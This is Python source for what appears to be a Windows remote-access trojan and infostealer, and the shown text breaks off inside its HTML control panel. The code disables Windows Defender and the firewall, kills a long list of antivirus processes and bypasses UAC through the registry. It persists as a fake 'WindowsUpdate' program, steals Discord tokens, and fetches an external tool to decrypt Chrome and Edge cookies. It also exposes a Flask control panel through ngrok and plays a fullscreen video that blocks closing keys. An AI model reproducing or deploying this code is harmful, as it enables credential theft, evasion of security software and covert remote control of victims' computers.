#  _____   ____    _   _  ____ _______    _____ _    _          _____  ______   _ 
# |  __ \ / __ \  | \ | |/ __ \__   __|  / ____| |  | |   /\   |  __ \|  ____| | |
# | |  | | |  | | |  \| | |  | | | |    | (___ | |__| |  /  \  | |__) | |__    | |
# | |  | | |  | | | . ` | |  | | | |     \___ \|  __  | / /\ \ |  _  /|  __|   | |
# | |__| | |__| | | |\  | |__| | | |     ____) | |  | |/ ____ \| | \ \| |____  |_|
# |_____/ \____/  |_| \_|\____/  |_|    |_____/|_|  |_/_/    \_\_|  \_\______| (_)
#                                                                                
# THIS CODE IS PRIVATE AND CONFIDENTIAL
# UNAUTHORIZED SHARING, COPYING, OR DISTRIBUTION IS STRICTLY PROHIBITED.
# 1ypi, vectxr.
auth_token = None
import asyncio
import base64
import ctypes
import time
import glob
import io
import json
import logging
import os
from pathlib import Path
import platform
import re
import shutil
import socket
import sqlite3
import pygame
import ssl
import subprocess
import sys
import tempfile
from threading import Thread, Event
import threading
import time
import urllib.request
import webbrowser
import winreg
import zipfile
from datetime import datetime, timedelta, timezone
from os import getenv
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
import urllib3
import aiohttp
import certifi
import cv2
import keyboard
import numpy as np
import pyautogui
import pyperclip
import requests
import urllib3
import tempfile
from moviepy import VideoFileClip
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import Flask, render_template_string, Response, request, jsonify, send_file
from PIL import Image, ImageGrab
from werkzeug.serving import make_server
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
import pythoncom
import sys, pathlib; sys.path.insert(0, str(pathlib.Path(f"{os.getcwd()}\\winpwnage").resolve()))
from uacMethod2 import *
disable_warnings_urllib3()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

auth_token = None
key_log = []
log_active = True 
stop_event = threading.Event()
last_sent_time = time.time()
current_dir = os.getcwd()
app = Flask(__name__)
streamer = None
flask_thread = None
ngrok_process = None
ngrok_url = None
server = None
CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".system32")
os.makedirs(CONFIG_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")

def watermark():
    return "\n\n***||@1ypi - https://github.com/1ypi||***\n***||@iznard - https://github.com/IzNard||***"
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def kill_browser_processes(browser_name):
    process_names = {
        "chrome": ["chrome.exe"],
        "edge": ["msedge.exe"],
        "brave": ["brave.exe"],
        "opera": ["opera.exe"],
        "yandex": ["browser.exe"],
        "firefox": ["firefox.exe"],
    }
    for proc in process_names.get(browser_name.lower(), []):
        try:
            subprocess.run(f"taskkill /f /im {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            logger.error(f"Error killing {proc}: {e}")

def disable_defender():
    try:
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
            'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"',
            'powershell -Command "Set-MpPreference -EnableNetworkProtection AuditMode"',
            'powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"',
            'powershell -Command "Set-MpPreference -MAPSReporting Disabled"',
            'powershell -Command "Set-MpPreference -HighThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -ModerateThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -LowThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -DisableArchiveScanning $true"',
            'powershell -Command "Set-MpPreference -DisableEmailScanning $true"',
            'powershell -Command "Set-MpPreference -DisableRemovableDriveScanning $true"',
            'powershell -Command "Set-MpPreference -DisableRestorePoint $true"',
            'netsh advfirewall set allprofiles state off',
            f'powershell -Command "Add-MpPreference -ExclusionPath \"{os.path.abspath(sys.argv[0])}\""',
            'powershell -Command "Add-MpPreference -ExclusionProcess \"python.exe\""',
            'powershell -Command "Add-MpPreference -ExclusionProcess \"pythonw.exe\""',
        ]

        for cmd in commands:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)

        return True
    except Exception as e:
        logger.error(f"Error disabling Defender: {e}")
        return False

def add_exclusion(path):
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \"{path}\""'
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logger.error(f"Error adding exclusion: {e}")
        return False

def kill_av_processes():
    av_processes = [
        "msmpeng", "msmpsvc", "securityhealthservice", "wdnissvc", 
        "webthreatdefsvc", "webthreatdefusersvc", "avp", "avpui", 
        "kavfs", "kavvs", "kes", "kis", "ksde", "ksos", "mcshield", 
        "msseces", "nortonsecurity", "ns", "nsafw", "nsd", "nst", 
        "symantec", "symcorpu", "symefasi", "ccsvchst", "ccsetmgr", 
        "ccevtmgr", "savservice", "avguard", "avshadow", "avgnt", 
        "avmailc", "avwebgrd", "bdagent", "bdnt", "vsserv", "fsma", 
        "fsms", "fshoster", "fsdfwd", "f-secure", "hips", "rtvscan", 
        "vstskmgr", "engineserver", "frameworkservice", "bullguard", 
        "clamav", "clamd", "freshclam", "sophos", "savd", "savadmin", 
        "hitmanpro", "zemana", "malwarebytes", "mbam", "mbamtray", 
        "mbae", "mbae-svc", "adaware", "spybot", "spyterminator", 
        "superantispyware", "avast", "avastui", "aswidsagent", 
        "avg", "avgui", "avira", "avguard", "avshadow", "avgnt", 
        "avmailc", "avwebgrd", "comodo", "cis", "cistray", "cmdagent", 
        "cpdaemon", "cpf", "cavwp", "panda", "psanhost", "psksvc", 
        "pavsrv", "pavprsrv", "pavfnsvr", "pavboot", "trendmicro", 
        "tmlisten", "ufseagnt", "tmcc", "tmactmon", "tmbmsrv", 
        "tmib", "tmlwf", "tmcomm", "tmobile", "zonealarm", "zatray", 
        "zaprivacy", "zaapp", "zauinst", "windefender", "defender", 
        "sense", "mssense", "smartscreen", "windowsdefender", "wd"
    ]

    try:
        subprocess.run(f"taskkill /f /im {','.join(av_processes)}", shell=True, 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logger.error(f"Error killing AV processes: {e}")
        return False

def save_config():
    config = {"auth_token": auth_token}
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def load_config():
    global auth_token
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)

def download_ngrok():
    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    
    ngrok_dir = os.path.join(os.path.expanduser("~"), ".system_files")
    os.makedirs(ngrok_dir, exist_ok=True)
    ngrok_path = os.path.join(ngrok_dir, "ngrok.exe")
    
    if os.path.exists(ngrok_path):
        return ngrok_path
    
    response = requests.get(url)
    zip_path = os.path.join(ngrok_dir, "ngrok.zip")
    
    with open(zip_path, 'wb') as f:
        f.write(response.content)
    
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(ngrok_dir)
    
    os.remove(zip_path)
    return ngrok_path

def setup_ngrok_auth(ngrok_path):
    if auth_token:
        subprocess.run([ngrok_path, "config", "add-authtoken", auth_token], 
                      capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
def start_ngrok(ngrok_path):
    global ngrok_process, ngrok_url
    
    setup_ngrok_auth(ngrok_path)
    
    ngrok_process = subprocess.Popen([ngrok_path, "http", "5000", "--log=stdout"], 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                   text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    timeout = 30
    start_time = time.time()
    ngrok_url = None
    
    while time.time() - start_time < timeout and ngrok_url is None:
        if ngrok_process.poll() is not None:
            break
            
        line = ngrok_process.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
        
        if "url=" in line and "https://" in line:
            match = re.search(r'url=https://([^\s]+)', line)
            if match:
                ngrok_url = "https://" + match.group(1)
                break
        elif "started tunnel" in line.lower() and "https://" in line:
            match = re.search(r'https://[^\s]+\.ngrok\.io', line)
            if match:
                ngrok_url = match.group(0)
                break
        elif "tunnel session" in line.lower() and "url=" in line:
            match = re.search(r'url=([^\s]+)', line)
            if match and "https://" in match.group(1):
                ngrok_url = match.group(1)
                break
    
    if not ngrok_url:
        time.sleep(3)
        try:
            response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=10)
            data = response.json()
            if data.get("tunnels"):
                for tunnel in data["tunnels"]:
                    if tunnel.get("public_url", "").startswith("https://"):
                        ngrok_url = tunnel["public_url"]
                        break
        except:
            pass
            
    
    return ngrok_url

def start_flask():
    server = make_server('0.0.0.0', 5000, app)
    server.serve_forever()

def stop_services():
    global flask_thread, ngrok_process, ngrok_url, server
    
    if streamer:
        streamer.running = False
    
    if server:
        server.shutdown()
    
    if ngrok_process:
        ngrok_process.terminate()
        ngrok_process = None
    
    ngrok_url = None

def get_start_menu_paths():
    paths = []
    user_start = Path(os.environ.get('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs'
    if user_start.exists():
        paths.append(user_start)
    all_users_start = Path(os.environ.get('PROGRAMDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs'
    if all_users_start.exists():
        paths.append(all_users_start)
    return paths

def search_shortcut(program_name):
    start_menu_paths = get_start_menu_paths()
    found_shortcuts = []
    for start_path in start_menu_paths:
        for lnk_file in start_path.rglob('*.lnk'):
            if program_name.lower() in lnk_file.stem.lower():
                found_shortcuts.append(lnk_file)
    return found_shortcuts

def get_shortcut_target(lnk_path):
    try:
        ps_command = f'''
        $sh = New-Object -ComObject WScript.Shell
        $target = $sh.CreateShortcut("{lnk_path}").TargetPath
        Write-Output $target
        '''
        result = subprocess.run(
            ['powershell', '-Command', ps_command],
            capture_output=True,
            text=True,
            timeout=5
        )
        target = result.stdout.strip()
        return target if target else None
    except:
        return None

class DiscordTokenStealer:
    @staticmethod
    def get_tokens():
        tokens = []
        paths = {
            'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
            'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data')
        }

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            try:
                if platform in ['Discord', 'Discord Canary', 'Discord PTB']:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.ldb') or file.endswith('.log'):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                                        for token in found_tokens:
                                            tokens.append({'platform': platform, 'token': token})
                                except:
                                    continue
                else:
                    leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
                    if os.path.exists(leveldb_path):
                        for file in os.listdir(leveldb_path):
                            if file.endswith('.ldb') or file.endswith('.log'):
                                file_path = os.path.join(leveldb_path, file)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                                        for token in found_tokens:
                                            tokens.append({'platform': platform, 'token': token})
                                except:
                                    continue
            except Exception as e:
                logger.error(f"Error extracting tokens from {platform}: {e}")
                continue

        return tokens

def hide_process():
    try:
        current_pid = os.getpid()
        try:
            subprocess.run(f'sc create "WindowsUpdateService" binPath= "{sys.executable}" start= auto', 
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        return True
    except Exception as e:
        logger.error(f"Error hiding process: {e}")
        return False
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
def add_to_startup():
    try:
        startup_paths = [
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        ]

        current_file = sys.argv[0]

        for startup_path in startup_paths:
            if os.path.exists(startup_path):
                target_path = os.path.join(startup_path, 'WindowsUpdate.exe')
                if not os.path.exists(target_path):
                    shutil.copy2(current_file, target_path)
                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True)

        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
        except:
            pass

        return True
    except Exception as e:
        logger.error(f"Error adding to startup: {e}")
        return False

class AdvancedBrowserCookieExtractor:
    def __init__(self):
        self.system = platform.system()
        if self.system != "Windows":
            raise Exception("This advanced version is specifically designed for Windows (Chrome v127+ ABE support)")
        self.cookies_data = {}
        self.abe_tool_path = None
        self.temp_tool_dir = None
        self.check_system_compatibility()

    def check_system_compatibility(self):
        system_info = {
            'system': platform.system(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'architecture': platform.architecture(),
            'release': platform.release(),
            'version': platform.version()
        }
        return system_info

    def close_browsers(self):
        browsers = [
            "chrome.exe",
            "msedge.exe", 
            "firefox.exe",
            "brave.exe",
            "opera.exe",
            "vivaldi.exe"
        ]
        closed_browsers = []
        for browser in browsers:
            try:
                result = subprocess.run(
                    ["tasklist", "/FI", f"IMAGENAME eq {browser}"],
                    capture_output=True, text=True, shell=True
                )
                if browser in result.stdout:
                    subprocess.run(["taskkill", "/F", "/IM", browser], 
                                 capture_output=True, shell=True)
                    closed_browsers.append(browser)
                    time.sleep(1)
            except Exception as e:
                print(f"⚠️  Warning: Could not close {browser}: {e}")
        if closed_browsers:
            time.sleep(3)
        return closed_browsers

    def check_and_download_abe_tool(self):
        temp_dir = tempfile.mkdtemp(prefix="abe_tool_")
        tool_exe = os.path.join(temp_dir, "chrome_inject.exe")
        try:
            release_url = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.15.0/chrome-injector-v0.15.0.zip"
            zip_path = os.path.join(temp_dir, "chrome-injector-v0.15.0.zip")
            urllib.request.urlretrieve(release_url, zip_path)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                arch = platform.machine().lower()
                if 'arm' in arch or 'aarch64' in arch or 'arm64' in arch:
                    target_exe = "chromelevator_arm64.exe"
                else:
                    target_exe = "chromelevator_x64.exe" 
                found = False
                for member in zip_ref.namelist():
                    if member == target_exe:
                        zip_ref.extract(member, temp_dir)
                        extracted_path = os.path.join(temp_dir, member)
                        if os.path.exists(extracted_path):
                            os.rename(extracted_path, tool_exe)
                            found = True
                        break
                if not found:
                    fallback = "chromelevator_x64.exe"
                    for member in zip_ref.namelist():
                        if member == fallback:
                            zip_ref.extract(member, temp_dir)
                            extracted_path = os.path.join(temp_dir, member)
                            if os.path.exists(extracted_path):
                                os.rename(extracted_path, tool_exe)
                                found = True
                            break
            os.remove(zip_path)
            if os.path.exists(tool_exe):
                self.abe_tool_path = tool_exe
                self.temp_tool_dir = temp_dir  
                return True
            else:
                return False
        except Exception as e:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return False

    def extract_abe_cookies_advanced(self, browser="chrome"):
        if not self.abe_tool_path:
            if not self.check_and_download_abe_tool():
                return []
        output_dir = tempfile.mkdtemp(prefix="abe_output_")
        try:
            cmd = [self.abe_tool_path, "--output-path", output_dir, browser.lower()]
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.path.dirname(self.abe_tool_path))
            if result.returncode == 0:
                cookies = self.parse_abe_output(output_dir, browser)
                try:
                    shutil.rmtree(output_dir)
                except:
                    pass
                return cookies
            else:
                try:
                    shutil.rmtree(output_dir)
                except:
                    pass
                return []
        except Exception as e:
            try:
                shutil.rmtree(output_dir)
            except:
                pass
            return []

    def parse_abe_output(self, output_dir, browser):
        cookies = []
        browser_dir = os.path.join(output_dir, browser.title())
        if not os.path.exists(browser_dir):
            return []
        for profile_name in os.listdir(browser_dir):
            profile_path = os.path.join(browser_dir, profile_name)
            if not os.path.isdir(profile_path):
                continue
            cookies_file = os.path.join(profile_path, "cookies.json")
            if os.path.exists(cookies_file):
                try:
                    with open(cookies_file, 'r', encoding='utf-8') as f:
                        profile_cookies = json.load(f)
                    for cookie in profile_cookies:
                        cookie['browser'] = browser.title()
                        cookie['profile'] = profile_name
                        if 'host' in cookie:
                            cookie['host'] = cookie['host']
                        cookies.append(cookie)
                except Exception as e:
                    pass
        return cookies

    def get_firefox_path(self):
        profiles_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
        if os.path.exists(profiles_path):
            for profile in os.listdir(profiles_path):
                if 'default' in profile.lower():
                    return os.path.join(profiles_path, profile, 'cookies.sqlite')
        return None

    def extract_firefox_cookies(self):
        db_path = self.get_firefox_path()
        if not db_path or not os.path.exists(db_path):
            return []
        temp_db = tempfile.mktemp(suffix='.sqlite')
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, creationTime
                FROM moz_cookies
            """)
            cookies = []
            for row in cursor.fetchall():
                host, name, value, path, expiry, is_secure, is_httponly, creation_time = row
                expires = None
                created = None
                if expiry:
                    try:
                        expires = datetime.fromtimestamp(expiry, tz=timezone.utc)
                    except:
                        expires = None
                if creation_time:
                    try:
                        created = datetime.fromtimestamp(creation_time / 1000000, tz=timezone.utc)
                    except:
                        created = None
                cookies.append({
                    'browser': 'Firefox',
                    'host': host,
                    'name': name,
                    'value': value,
                    'path': path,
                    'expires': expires.isoformat() if expires else None,
                    'secure': bool(is_secure),
                    'httponly': bool(is_httponly),
                    'created': created.isoformat() if created else None
                })
            conn.close()
            return cookies
        except Exception as e:
            return []
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)

    def extract_all_cookies(self, close_browsers=True):
        all_cookies = []
        if close_browsers:
            self.close_browsers()
        chrome_cookies = self.extract_abe_cookies_advanced("chrome")
        all_cookies.extend(chrome_cookies)
        edge_cookies = self.extract_abe_cookies_advanced("edge")
        all_cookies.extend(edge_cookies)
        firefox_cookies = self.extract_firefox_cookies()
        all_cookies.extend(firefox_cookies)
        return all_cookies

    def save_to_json(self, cookies, filename="browser_cookies_decrypted.json"):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(cookies, f, indent=2, ensure_ascii=False)
        return filename

    def get_cookies_summary(self, cookies):
        if not cookies:
            return "❌ No cookies found"
        browsers = {}
        domains = {}
        decrypted_count = 0
        for cookie in cookies:
            browser = cookie.get('browser', 'Unknown')
            browsers[browser] = browsers.get(browser, 0) + 1
            host = cookie.get('host', 'Unknown')
            domains[host] = domains.get(host, 0) + 1
            value = cookie.get('value', '')
            if value and not value.startswith('[ENCRYPTED'):
                decrypted_count += 1
        summary = f"""🍪 **Cookie Extraction Summary:**
Total cookies: {len(cookies)}
Successfully decrypted: {decrypted_count}
Encryption bypass rate: {(decrypted_count/len(cookies)*100):.1f}%

📊 By browser:
{chr(10).join(f"  {browser}: {count}" for browser, count in browsers.items())}

🌐 Top 10 domains:
{chr(10).join(f"  {domain}: {count}" for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10])}"""
        return summary

def cleanup(self):
    if hasattr(self, 'temp_tool_dir') and self.temp_tool_dir and os.path.exists(self.temp_tool_dir):
        try:
            shutil.rmtree(self.temp_tool_dir)
        except Exception as e:
            pass

def __del__(self):
    self.cleanup()

extractor = None


def play_video_fullscreen_blocking(video_path):
    import cv2
    import keyboard
    import win32gui
    import win32con
    import pythoncom
    import pygame
    import time
    import ctypes
    from ctypes import wintypes
    
    # Windows constants
    WH_KEYBOARD_LL = 13
    HC_ACTION = 0
    VK_F4 = 0x73
    VK_MENU = 0x12
    
    CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    alt_pressed = False
    
    def ll_keyboard_hook(n_code, w_param, l_param):
        nonlocal alt_pressed
        if n_code == HC_ACTION:
            kb_struct = ctypes.cast(l_param, ctypes.POINTER(wintypes.KBDLLHOOKSTRUCT)).contents
            if kb_struct.vkCode == VK_MENU:
                alt_pressed = w_param == win32con.WM_KEYDOWN
            if alt_pressed and kb_struct.vkCode == VK_F4:
                return 1
        return ctypes.windll.user32.CallNextHookEx(None, n_code, w_param, l_param)
    
    def block_ctrl_c(e):
        if e.event_type == keyboard.KEY_DOWN:
            if e.name == 'c' and keyboard.is_pressed('ctrl'):
                return False
        return True
    
    # Initialize variables
    temp_audio = None
    video = None
    cap = None
    keyboard_hook = None
    has_audio = False
    hwnd = None
    
    try:
        if not os.path.exists(video_path):
            return False, f"Video file not found: {video_path}"
        
        print(f"Loading video: {video_path}")
        
        # Force quit any existing mixer first
        try:
            pygame.mixer.quit()
            pygame.quit()
        except:
            pass
        
        time.sleep(0.5)
        
        # Load video
        video = VideoFileClip(video_path)
        has_audio = video.audio is not None
        video_duration = video.duration
        print(f"Video loaded. Has audio: {has_audio}, Duration: {video_duration}s")
        
        # Extract audio with WAV format
        if has_audio:
            try:
                temp_dir = tempfile.gettempdir()
                temp_audio = os.path.join(temp_dir, f"temp_audio_{int(time.time())}.wav")
                
                print("Extracting audio as WAV...")
                video.audio.write_audiofile(temp_audio, codec='pcm_s16le', logger=None)
                
                if not os.path.exists(temp_audio) or os.path.getsize(temp_audio) == 0:
                    print("Audio extraction failed")
                    has_audio = False
                    temp_audio = None
                else:
                    print(f"Audio extracted: {temp_audio} ({os.path.getsize(temp_audio)} bytes)")
                
            except Exception as audio_error:
                print(f"Audio extraction error: {audio_error}")
                import traceback
                traceback.print_exc()
                has_audio = False
                temp_audio = None
        
        # Initialize pygame mixer ONLY if we have audio
        if has_audio and temp_audio:
            try:
                # Initialize pygame
                pygame.init()
                pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=2048)
                
                time.sleep(0.2)
                
                print("Pygame initialized successfully")
                
                # Load audio
                pygame.mixer.music.load(temp_audio)
                pygame.mixer.music.set_volume(1.0)
                
                print("Audio loaded successfully")
                
            except Exception as mixer_error:
                print(f"Mixer error: {mixer_error}")
                import traceback
                traceback.print_exc()
                has_audio = False
        
        # Setup keyboard hooks
        keyboard_callback = CMPFUNC(ll_keyboard_hook)
        keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL, keyboard_callback, 
            ctypes.windll.kernel32.GetModuleHandleW(None), 0
        )
        keyboard.hook(block_ctrl_c)
        
        # Create window
        cv2.namedWindow("___FULLSCREEN_VIDEO___", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("___FULLSCREEN_VIDEO___", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        
        hwnd = win32gui.FindWindow(None, "___FULLSCREEN_VIDEO___")
        if hwnd:
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        
        # Start video capture
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            raise FileNotFoundError(f"Cannot open video: {video_path}")
        
        fps = cap.get(cv2.CAP_PROP_FPS)
        if fps <= 0 or fps > 120:
            fps = 30
        delay = int(1000/fps)
        
        total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
        
        print(f"Video FPS: {fps}, delay: {delay}ms, total frames: {total_frames}")
        
        # Playback loop with sync
        frame_count = 0
        playback_start_time = time.time()
        audio_started = False
        sync_check_interval = 30  # Check sync every 30 frames
        max_desync_threshold = 0.1  # 100ms desync threshold
        
        print("Starting playback...")
        
        while cap.isOpened():
            loop_start = time.time()
            
            ret, frame = cap.read()
            if not ret:
                break
            
            # Calculate current video position based on frame count
            video_position = frame_count / fps
            
            # Start audio synchronized with video
            if has_audio and not audio_started and frame_count == 0:
                pygame.mixer.music.play()
                audio_start_time = time.time()
                audio_started = True
                print("✓ AUDIO STARTED")
            
            # Periodic sync check
            if has_audio and audio_started and frame_count % sync_check_interval == 0 and frame_count > 0:
                # Calculate actual elapsed time
                actual_elapsed = time.time() - playback_start_time
                
                # Calculate audio position (pygame doesn't provide direct position, so we estimate)
                audio_position = actual_elapsed
                
                # Calculate desync
                desync = abs(video_position - audio_position)
                
                if desync > max_desync_threshold:
                    print(f"⚠ Desync detected: {desync:.3f}s at frame {frame_count}")
                    # Restart audio at correct position
                    try:
                        pygame.mixer.music.stop()
                        pygame.mixer.music.play(start=video_position)
                        print(f"✓ Audio resynced to {video_position:.2f}s")
                    except:
                        # If start parameter doesn't work, just restart
                        pygame.mixer.music.play()
            
            # Display frame
            screen_width, screen_height = pyautogui.size()
            frame = cv2.resize(frame, (screen_width, screen_height))
            cv2.imshow("___FULLSCREEN_VIDEO___", frame)
            
            if hwnd and frame_count % 30 == 0:
                try:
                    win32gui.SetForegroundWindow(hwnd)
                except:
                    pass
            
            # Audio status check
            if has_audio and audio_started and frame_count % 50 == 0:
                if not pygame.mixer.music.get_busy():
                    print(f"⚠ Audio stopped at frame {frame_count}, restarting...")
                    try:
                        pygame.mixer.music.play(start=video_position)
                    except:
                        pygame.mixer.music.play()
            
            # Handle timing to maintain frame rate
            if cv2.waitKey(1) & 0xFF == 27:
                continue
            
            frame_count += 1
            
            # Precise frame timing
            loop_elapsed = (time.time() - loop_start) * 1000  # Convert to ms
            sleep_time = max(1, delay - int(loop_elapsed))
            if sleep_time > 1:
                time.sleep(sleep_time / 1000.0)
        
        elapsed = time.time() - playback_start_time
        print(f"Finished: {frame_count} frames in {elapsed:.2f}s")
        
        return True, f"Video played ({frame_count} frames, {elapsed:.2f}s)"
        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        return False, str(e)
        
    finally:
        print("Cleanup...")
        
        # Stop audio
        try:
            if has_audio and pygame.mixer.get_init():
                pygame.mixer.music.stop()
                time.sleep(0.2)
                pygame.mixer.quit()
                pygame.quit()
                print("Audio stopped")
        except Exception as e:
            print(f"Error stopping audio: {e}")
        
        # Close video
        if video:
            try:
                video.close()
            except:
                pass
        
        # Remove temp file
        if temp_audio and os.path.exists(temp_audio):
            try:
                time.sleep(0.5)
                os.remove(temp_audio)
                print("Temp file removed")
            except Exception as e:
                print(f"Couldn't remove temp: {e}")
        
        # Release capture
        if cap:
            try:
                cap.release()
            except:
                pass
        
        # Cleanup windows
        try:
            cv2.destroyAllWindows()
        except:
            pass
        
        # Remove hooks
        if keyboard_hook:
            try:
                ctypes.windll.user32.UnhookWindowsHookEx(keyboard_hook)
            except:
                pass
        
        try:
            keyboard.unhook_all()
        except:
            pass
        
        # Unblock input
        if is_admin():
            try:
                windll = ctypes.WinDLL('user32')
                windll.BlockInput(False)
            except:
                pass
        
        # Show cursor
        try:
            ctypes.windll.user32.ShowCursor(True)
        except:
            pass
        
        print("Cleanup complete")

HTML_INTERFACE = """
<!DOCTYPE html>
<html>
<head>
    <title>System Control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        .header h1 {
            color: #4CAF50;
            margin: 0;
            font-size: 2.5em;
            text-shadow: 0 2px 10px rgba(76, 175, 80, 0.3);
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .status-item {
